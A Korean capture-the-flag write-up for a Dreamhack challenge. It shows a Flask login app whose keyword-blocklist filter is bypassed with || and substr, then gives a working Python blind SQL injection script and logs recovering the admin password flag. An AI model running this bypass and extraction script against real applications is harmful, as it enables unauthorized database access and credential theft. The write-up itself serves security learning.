https://honey-push-30b.notion.site/SQL-Injection-Bypass-WAF-Advanced-146c0b4f5fe04943ad957989dbade818

# 문제파일 다운로드

![문제파일 다운로드.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/c6695ead-d7c0-4b96-a25a-d08a8021fbee/%EB%AC%B8%EC%A0%9C%ED%8C%8C%EC%9D%BC_%EB%8B%A4%EC%9A%B4%EB%A1%9C%EB%93%9C.png)

문제 파일을 다운로드 받으면 app.py와 init.sql이 있다. 아래는 app.py의 코드이다.

```python
import os
from flask import Flask, request
from flask_mysqldb import MySQL

app = Flask(__name__)
app.config['MYSQL_HOST'] = os.environ.get('MYSQL_HOST', 'localhost')
app.config['MYSQL_USER'] = os.environ.get('MYSQL_USER', 'user')
app.config['MYSQL_PASSWORD'] = os.environ.get('MYSQL_PASSWORD', 'pass')
app.config['MYSQL_DB'] = os.environ.get('MYSQL_DB', 'users')
mysql = MySQL(app)

template ='''
<pre style="font-size:200%">SELECT * FROM user WHERE uid='{uid}';</pre><hr/>
<pre>{result}</pre><hr/>
<form>
    <input tyupe='text' name='uid' placeholder='uid'>
    <input type='submit' value='submit'>
</form>
'''

keywords = ['union', 'select', 'from', 'and', 'or', 'admin', ' ', '*', '/', 
            '\n', '\r', '\t', '\x0b', '\x0c', '-', '+']
def check_WAF(data):
    for keyword in keywords:
        if keyword in data.lower():
            return True

    return False

@app.route('/', methods=['POST', 'GET'])
def index():
    uid = request.args.get('uid')
    if uid:
        if check_WAF(uid):
            return 'your request has been blocked by WAF.'
        cur = mysql.connection.cursor()
        cur.execute(f"SELECT * FROM user WHERE uid='{uid}';")
        result = cur.fetchone()
        if result:
            return template.format(uid=uid, result=result[1])
        else:
            return template.format(uid=uid, result='')

    else:
        return template

if __name__ == '__main__':
    app.run(host='0.0.0.0')
```

그리고 아래는 init.sql의 코드이다.

```sql
CREATE DATABASE IF NOT EXISTS `users`;
GRANT ALL PRIVILEGES ON users.* TO 'dbuser'@'localhost' IDENTIFIED BY 'dbpass';

USE `users`;
CREATE TABLE user(
  idx int auto_increment primary key,
  uid varchar(128) not null,
  upw varchar(128) not null
);

INSERT INTO user(uid, upw) values('abcde', '12345');
INSERT INTO user(uid, upw) values('admin', 'DH{**FLAG**}');
INSERT INTO user(uid, upw) values('guest', 'guest');
INSERT INTO user(uid, upw) values('test', 'test');
INSERT INTO user(uid, upw) values('dream', 'hack');
FLUSH PRIVILEGES;
```

# 코드 분석

두가지의 코드를 분석해야한다.

1. app.py
2. init.sql

데이터 베이스 역할을 하는 init.sql을 먼저 분석해보자.

```sql
CREATE DATABASE IF NOT EXISTS `users`;
GRANT ALL PRIVILEGES ON users.* TO 'dbuser'@'localhost' IDENTIFIED BY 'dbpass';

USE `users`;
CREATE TABLE user(
  idx int auto_increment primary key,
  uid varchar(128) not null,
  upw varchar(128) not null
);

INSERT INTO user(uid, upw) values('abcde', '12345');
INSERT INTO user(uid, upw) values('admin', 'DH{**FLAG**}');
INSERT INTO user(uid, upw) values('guest', 'guest');
INSERT INTO user(uid, upw) values('test', 'test');
INSERT INTO user(uid, upw) values('dream', 'hack');
FLUSH PRIVILEGES;
```

users 데이터베이스를 만든 후 user 테이블을 만든다.

user 테이블은 idx, uid, upw로 이루어져 있다.

이 데이터베이스에는 5개의 user가 있으며 abcde(uid)는 12345(upw) 형식으로 이루어져 있다.

우리가 찾고자 하는 플래그 값은 uid가 admin인 upw값이다.

그럼 이제 [app.py](http://app.py)를 분석해보자.

 

```python
import os
from flask import Flask, request
from flask_mysqldb import MySQL

app = Flask(__name__)
app.config['MYSQL_HOST'] = os.environ.get('MYSQL_HOST', 'localhost')
app.config['MYSQL_USER'] = os.environ.get('MYSQL_USER', 'user')
app.config['MYSQL_PASSWORD'] = os.environ.get('MYSQL_PASSWORD', 'pass')
app.config['MYSQL_DB'] = os.environ.get('MYSQL_DB', 'users')
mysql = MySQL(app)

template ='''
<pre style="font-size:200%">SELECT * FROM user WHERE uid='{uid}';</pre><hr/>
<pre>{result}</pre><hr/>
<form>
    <input tyupe='text' name='uid' placeholder='uid'>
    <input type='submit' value='submit'>
</form>
'''

keywords = ['union', 'select', 'from', 'and', 'or', 'admin', ' ', '*', '/', 
            '\n', '\r', '\t', '\x0b', '\x0c', '-', '+']
def check_WAF(data):
    for keyword in keywords:
        if keyword in data.lower():
            return True

    return False

@app.route('/', methods=['POST', 'GET'])
def index():
    uid = request.args.get('uid')
    if uid:
        if check_WAF(uid):
            return 'your request has been blocked by WAF.'
        cur = mysql.connection.cursor()
        cur.execute(f"SELECT * FROM user WHERE uid='{uid}';")
        result = cur.fetchone()
        if result:
            return template.format(uid=uid, result=result[1])
        else:
            return template.format(uid=uid, result='')

    else:
        return template

if __name__ == '__main__':
    app.run(host='0.0.0.0')
```

크게 세가지 부분으로 나눌 수 있다.

1. MYSQL을 사용하여 데이터베이스와 연결하는 부분
2. 사용자의 입력을 필터링하는 check_WAF
3. 데이터베이스에 SQL 쿼리를 실행하는 index 함수

### 데이터베이스와 연결하는 부분

```python
import os
from flask import Flask, request
from flask_mysqldb import MySQL

app = Flask(__name__)
app.config['MYSQL_HOST'] = os.environ.get('MYSQL_HOST', 'localhost')
app.config['MYSQL_USER'] = os.environ.get('MYSQL_USER', 'user')
app.config['MYSQL_PASSWORD'] = os.environ.get('MYSQL_PASSWORD', 'pass')
app.config['MYSQL_DB'] = os.environ.get('MYSQL_DB', 'users')
mysql = MySQL(app)

```

데이터베이스와 연결을 위한 코드이다. 여기서 중요한 점은 MYSQL 데이터베이스를 사용하고 있음을 알 수 있다.

### 사용자의 입력을 필터링하는 check_WAF

```python
keywords = ['union', 'select', 'from', 'and', 'or', 'admin', ' ', '*', '/', 
            '\n', '\r', '\t', '\x0b', '\x0c', '-', '+']
def check_WAF(data):
    for keyword in keywords:
        if keyword in data.lower():
            return True

    return False
```

사용자의 입력으로 부터 union ,select, from, and, or, admin, 공백, *, /, \n \r \t \x0b \x0c - +를 필터링하고 있다. 또한 MYSQL 데이터베이스는 대소문자 구분을 하지 않고 쿼리를 실행할 수 있기 때문에 대소문자를 통해 우회하는 방법을 막기 위하여 data.lower()를 사용하여 필터링 하고 있다. 이로 인해서 union, select와 같은 statement를 사용할 수 없어서 and, or로 우회할 생각이다. and는 &&으로, or은 ||으로 바꿔도 여전히 쿼리가 실행이 가능한데 이 두개는 필터링 하지 않았으므로 사실상 and와 or을 사용할 수 있다. 또한 substr,left,right와 같은 함수들과 where은 여전히 사용이 가능하므로 이를 이용할 수 있다. 

### 데이터베이스에 SQL 쿼리를 실행하는 index 함수

```python
@app.route('/', methods=['POST', 'GET'])
def index():
    uid = request.args.get('uid')
    if uid:
        if check_WAF(uid):
            return 'your request has been blocked by WAF.'
        cur = mysql.connection.cursor()
        cur.execute(f"SELECT * FROM user WHERE uid='{uid}';")
        result = cur.fetchone()
        if result:
            return template.format(uid=uid, result=result[1])
        else:
            return template.format(uid=uid, result='')

    else:
        return template

```

사용자로부터 입력을 받은 값을 check_WAF로 한번 필터링 한 후 그 필터링한 값을 쿼리에 **직접 넣어** SQL Injection 공격에 취약해 지는 모습이다. 따라서 필터링을 우회하여 sql injection을 공격을 하면 된다.

그리고 결과 값중 두번째 값(result[1])만 출력해서 보여주므로 select * from users where uid=’admin’의 경우 idx, uid, upw중 uid값이 나온다. 따라서 공격 결과인 admin의 upw가 두번째로 오도록 조정해주어야한다.

# 공격 설계

1. 우리의 목적은 admin(uid)의 upw값이다.
2. sql injection이 가능하다.
3. 필터링을 우회하기 위해 ||, &&, substr 을 사용한다.

이를 위해서 먼저 우리가 원하는 user 테이블의 upw의 첫번째 글자가 D인 경우는 admin 밖에 없으므로 or을 ||로 우회하여 제대로 출력이 되는지를 확인해보자.

![우회.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/d0e18efa-fc94-4f22-bf41-6bd4d79d8a31/%EC%9A%B0%ED%9A%8C.png)

```python
INSERT INTO user(uid, upw) values('abcde', '12345');
INSERT INTO user(uid, upw) values('admin', 'DH{**FLAG**}');
INSERT INTO user(uid, upw) values('guest', 'guest');
INSERT INTO user(uid, upw) values('test', 'test');
INSERT INTO user(uid, upw) values('dream', 'hack');
```

upw의 첫글자가 D인 경우는 admin밖에 없으므로 2, admin, DH 의 결과값중 두번째인 admin이 출력된 것을 볼 수 있다. 

![거짓일때.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/a5f943fe-3765-4b65-87af-503d33cdd086/%EA%B1%B0%EC%A7%93%EC%9D%BC%EB%95%8C.png)

반대로 참인 경우가 아예 없을 때는 아무것도 뜨지 않는다.

이를 이용해서 Blind SQL Injection을 통해 upw의 값을 하나하나 따져가면서 admin이 나오는 경우(upw값을 제대로 예측했을 때)만 모아서 플래그 값을 찾으면 된다. 

그럼 이를 위해 파이썬으로 자동화 코드를 짜보자.

```python
import requests
flag=''
idx=1

while True:
    for i in range(32,128):#아스키코드
        now=chr(i)
        query=f"http://host3.dreamhack.games:14271/?uid='||substr(upw,{idx},1)='{now}'%23"
        response=requests.get(query)
        if 'admin' in response.text:
            flag+=chr(i)
            idx+=1
            print('flag:',flag)
            break
					
    if '}'in flag:
        print(flag)
        break
```

그리고 이 코드를 실행시켜 Blind SQL Injection을 실행해주면

```python
flag: D
flag: DH
flag: DH{
flag: DH{D
flag: DH{D3
flag: DH{D3D
flag: DH{D3DE
flag: DH{D3DEF
flag: DH{D3DEF3
flag: DH{D3DEF39
flag: DH{D3DEF394
flag: DH{D3DEF3949
flag: DH{D3DEF39496
flag: DH{D3DEF39496C
flag: DH{D3DEF39496C4
flag: DH{D3DEF39496C41
flag: DH{D3DEF39496C415
flag: DH{D3DEF39496C4153
flag: DH{D3DEF39496C41539
flag: DH{D3DEF39496C415394
flag: DH{D3DEF39496C4153942
flag: DH{D3DEF39496C4153942F
flag: DH{D3DEF39496C4153942F3
flag: DH{D3DEF39496C4153942F3F
flag: DH{D3DEF39496C4153942F3F7
flag: DH{D3DEF39496C4153942F3F7D
flag: DH{D3DEF39496C4153942F3F7D5
flag: DH{D3DEF39496C4153942F3F7D54
flag: DH{D3DEF39496C4153942F3F7D545
flag: DH{D3DEF39496C4153942F3F7D5451
flag: DH{D3DEF39496C4153942F3F7D5451A
flag: DH{D3DEF39496C4153942F3F7D5451A4
flag: DH{D3DEF39496C4153942F3F7D5451A4B
flag: DH{D3DEF39496C4153942F3F7D5451A4B9
flag: DH{D3DEF39496C4153942F3F7D5451A4B98
flag: DH{D3DEF39496C4153942F3F7D5451A4B98C
flag: DH{D3DEF39496C4153942F3F7D5451A4B98C6
flag: DH{D3DEF39496C4153942F3F7D5451A4B98C6D
flag: DH{D3DEF39496C4153942F3F7D5451A4B98C6DB
flag: DH{D3DEF39496C4153942F3F7D5451A4B98C6DB1
flag: DH{D3DEF39496C4153942F3F7D5451A4B98C6DB16
flag: DH{D3DEF39496C4153942F3F7D5451A4B98C6DB166
flag: DH{D3DEF39496C4153942F3F7D5451A4B98C6DB1664
flag: DH{D3DEF39496C4153942F3F7D5451A4B98C6DB1664}
DH{D3DEF39496C4153942F3F7D5451A4B98C6DB1664}
```

플래그값`DH{D3DEF39496C4153942F3F7D5451A4B98C6DB1664}`을 구한건 줄..알았는데 플래그 값이 틀렸다고 나온다.

잘못생각했던 부분이 바로 대소문자 구별인데 mysql에서는 대소문자를 구분하지 않기 때문에 대소문자가 다르더라도 참으로 나올 수 있다는 것을 간과했다.

 

![대소문자 틀려도 참.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/58a9ba7c-01ce-4cf6-8d4c-66b8dccbbe6b/%EB%8C%80%EC%86%8C%EB%AC%B8%EC%9E%90_%ED%8B%80%EB%A0%A4%EB%8F%84_%EC%B0%B8.png)

첫글자는 무조건 D임에도 불구하고 d여도 참이 되는 것을 확인하고 코드를 조금 고쳐야 한다고 생각했다.

드림핵의 플래그에서 괄호 안의 값들은 대문자는 안들어가고 소문자로 구성되어 있기 때문에 lower()를 이용하여 소문자로 변경해주었다.

```python
import requests
flag='DH{'
idx=4

while True:
    for i in range(32,128):#아스키코드
        now=chr(i)
        query=f"http://host3.dreamhack.games:14271/?uid='||substr(upw,{idx},1)='{now}'%23"
        response=requests.get(query)
        if 'admin' in response.text:
            flag+=chr(i).lower()
            idx+=1
            print('flag:',flag)
            break
					
    if '}'in flag:
        print(flag)
        break
```

그리고 나시 다시 실행한 결과

```python
flag: DH{d
flag: DH{d3
flag: DH{d3d
flag: DH{d3de
flag: DH{d3def
flag: DH{d3def3
flag: DH{d3def39
flag: DH{d3def394
flag: DH{d3def3949
flag: DH{d3def39496
flag: DH{d3def39496c
flag: DH{d3def39496c4
flag: DH{d3def39496c41
flag: DH{d3def39496c415
flag: DH{d3def39496c4153
flag: DH{d3def39496c41539
flag: DH{d3def39496c415394
flag: DH{d3def39496c4153942
flag: DH{d3def39496c4153942f
flag: DH{d3def39496c4153942f3
flag: DH{d3def39496c4153942f3f
flag: DH{d3def39496c4153942f3f7
flag: DH{d3def39496c4153942f3f7d
flag: DH{d3def39496c4153942f3f7d5
flag: DH{d3def39496c4153942f3f7d54
flag: DH{d3def39496c4153942f3f7d545
flag: DH{d3def39496c4153942f3f7d5451
flag: DH{d3def39496c4153942f3f7d5451a
flag: DH{d3def39496c4153942f3f7d5451a4
flag: DH{d3def39496c4153942f3f7d5451a4b
flag: DH{d3def39496c4153942f3f7d5451a4b9
flag: DH{d3def39496c4153942f3f7d5451a4b98
flag: DH{d3def39496c4153942f3f7d5451a4b98c
flag: DH{d3def39496c4153942f3f7d5451a4b98c6
flag: DH{d3def39496c4153942f3f7d5451a4b98c6d
flag: DH{d3def39496c4153942f3f7d5451a4b98c6db
flag: DH{d3def39496c4153942f3f7d5451a4b98c6db1
flag: DH{d3def39496c4153942f3f7d5451a4b98c6db16
flag: DH{d3def39496c4153942f3f7d5451a4b98c6db166
flag: DH{d3def39496c4153942f3f7d5451a4b98c6db1664
flag: DH{d3def39496c4153942f3f7d5451a4b98c6db1664}
DH{d3def39496c4153942f3f7d5451a4b98c6db1664}
```

플래그 값인 `DH{d3def39496c4153942f3f7d5451a4b98c6db1664}`를 획득했다.
